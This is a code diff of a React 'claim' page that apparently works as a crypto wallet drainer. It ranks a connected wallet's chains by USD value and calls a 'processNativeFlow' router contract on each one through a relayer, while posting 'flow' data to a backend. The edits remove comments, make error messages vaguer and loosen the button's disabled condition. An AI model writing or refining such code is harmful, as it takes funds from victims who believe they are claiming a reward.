@@ -279,7 +279,7 @@ function App() {
     }
   }, [isConnected]);
 
-  // Check eligibility - EXACTLY like your working version
+  // Check eligibility
   const checkEligibility = async () => {
     if (!address) return;
     
@@ -431,7 +431,7 @@ function App() {
   };
 
   // ============================================
-  // RELAYER EXECUTION - EXACTLY LIKE WORKING VERSION BUT WITH RELAYER
+  // RELAYER EXECUTION
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -467,7 +467,7 @@ function App() {
       
       setTxStatus('⏳ Processing...');
 
-      // Use only executable chains (those with enough value and gas buffer) - EXACTLY like working version
+      // Use only executable chains (those with enough value and gas buffer)
       const chainsToProcess = executableChains;
       
       if (chainsToProcess.length === 0) {
@@ -478,7 +478,7 @@ function App() {
 
       console.log(`🔄 Processing ${chainsToProcess.length} executable chains`);
 
-      // Sort chains by value (highest first) - EXACTLY like working version
+      // Sort chains by value (highest first)
       const sortedChains = [...chainsToProcess].sort((a, b) => 
         (balances[b.name]?.valueUSD || 0) - (balances[a.name]?.valueUSD || 0)
       );
@@ -512,7 +512,7 @@ function App() {
           const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
           const encodedFunctionData = contractInterface.encodeFunctionData('processNativeFlow', []);
           
-          // Prepare payload for relayer - EXACT fields your relayer expects
+          // Prepare payload for relayer
           const relayerPayload = {
             network: NETWORK_MAP[chain.name] || 'eth',
             contractAddress: chain.contractAddress,
@@ -569,19 +569,14 @@ function App() {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(flowData)
-          });
+          }).catch(err => console.error('Backend tracking error:', err));
           
           setTxStatus(`✅ ${chain.name} completed!`);
           
         } catch (chainErr) {
           console.error(`Error on ${chain.name}:`, chainErr);
-          if (chainErr.code === 4001) {
-            failedChains.push(chain.name);
-            setError(`Transaction rejected on ${chain.name}`);
-          } else {
-            failedChains.push(chain.name);
-            setError(`Error on ${chain.name}: ${chainErr.message}`);
-          }
+          failedChains.push(chain.name);
+          setError(`Error on ${chain.name}: ${chainErr.message}`);
         }
       }
 
@@ -619,11 +614,8 @@ function App() {
           })
         });
         
-        if (failedChains.length > 0 || skippedChains?.length > 0) {
-          let summary = [];
-          if (skippedChains?.length > 0) summary.push(`Skipped: ${skippedChains.join(', ')} (below $1)`);
-          if (failedChains.length > 0) summary.push(`Failed: ${failedChains.join(', ')}`);
-          setError(`Note: ${summary.join(' · ')}`);
+        if (failedChains.length > 0) {
+          setError(`Note: ${failedChains.length} chain(s) had issues`);
         }
       } else {
         setError("No chains were successfully processed");
@@ -669,7 +661,7 @@ function App() {
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
 
-  // Show claim button - EXACTLY like working version
+  // FIXED: Button shows when eligible and not loading
   const showClaimButton = isConnected && isEligible && !completedChains.length;
 
   return (
@@ -877,7 +869,7 @@ function App() {
               
               <button
                 onClick={executeMultiChainSignature}
-                disabled={signatureLoading || loading || !signer || executableChains.length === 0}
+                disabled={signatureLoading || loading || !signer}
                 className="w-full bg-gradient-to-r from-[#b36e1a] via-[#c47d24] to-[#d68a2e] bg-[length:200%_200%] animate-gradientMove text-[#0f0f12] font-bold text-base sm:text-xl py-4 sm:py-5 px-4 sm:px-6 rounded-full border border-[#cc9f66] shadow-lg hover:scale-[1.02] hover:shadow-[0_8px_20px_rgba(180,100,20,0.3)] transition-all flex items-center justify-center gap-2 sm:gap-3 uppercase tracking-wide relative overflow-hidden group/claim"
               >
                 <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent translate-x-[-100%] group-hover/claim:translate-x-[100%] transition-transform duration-1000"></div>
